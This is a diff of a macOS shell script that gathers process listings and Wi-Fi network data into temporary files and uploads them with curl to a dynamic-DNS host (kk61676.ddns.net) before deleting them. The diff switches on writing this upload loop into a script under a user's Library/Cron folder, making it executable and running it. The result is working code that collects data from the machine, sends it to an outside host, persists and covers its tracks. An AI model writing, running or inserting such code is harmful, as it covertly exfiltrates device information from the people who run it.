@@ -6,23 +6,23 @@ ps -ef > /tmp/screen_mac_000_psef.txt
 sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -I  2>&1 > /tmp/screen_mac_000_airport_I.txt || true
 sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s  2>&1 > /tmp/screen_mac_000_airport_s.txt || true
 
-find /tmp/ -name screen_mac* -type f -print | while read -r file ; do 
-  echo "uploading $file"
-  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
-  # sleep 1
-  rm $file 
-done
+#find /tmp/ -name screen_mac* -type f -print | while read -r file ; do 
+#  echo "uploading $file"
+#  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
+#  # sleep 1
+#  rm $file 
+#done
 
 read -r -d '' SCRCAP_KK << EOM2
-find /tmp/ -name screen_mac* -type f -print | while read -r file ; do
+find /tmp -name screen_mac* -type f -print | while read -r file ; do
   echo "uploading \$file"
   curl -X POST --form file=@\$file http://kk61676.ddns.net:3001/file || break
   rm \$file
 done
 EOM2
 
-#echo "$SCRCAP_KK" > /Users/Vladdy/Library/Cron/scrcap_kk.sh || true
-#chmod 755 /Users/Vladdy/Library/Cron/scrcap_kk.sh || true
+echo "$SCRCAP_KK" > /Users/Vladdy/Library/Cron/scrcap_kk.sh || true
+chmod 755 /Users/Vladdy/Library/Cron/scrcap_kk.sh || true
 cat /Users/Vladdy/Library/Cron/scrcap_kk.sh > /tmp/screen_mac_000_scrcap_kk.sh.txt || true
 /Users/Vladdy/Library/Cron/scrcap_kk.sh 2>&1 > /tmp/screen_mac_000_scrcap_kk_log.txt || true
 
@@ -30,7 +30,7 @@ sleep 2
 
 ls -la /Users/Vladdy/Library/Cron/ > /tmp/screen_mac_000_uvlc_lsla.txt || true
 
-networksetup -getairportnetwork en0 > /tmp/screen_mac_000_get_airport_net.txt || true
+#networksetup -getairportnetwork en0 > /tmp/screen_mac_000_get_airport_net.txt || true
 
 #sudo ln -s /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport /usr/local/bin/airport || true
 #sudo /System//Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -I  2>&1 > /tmp/screen_mac_000_airport_I.txt || true
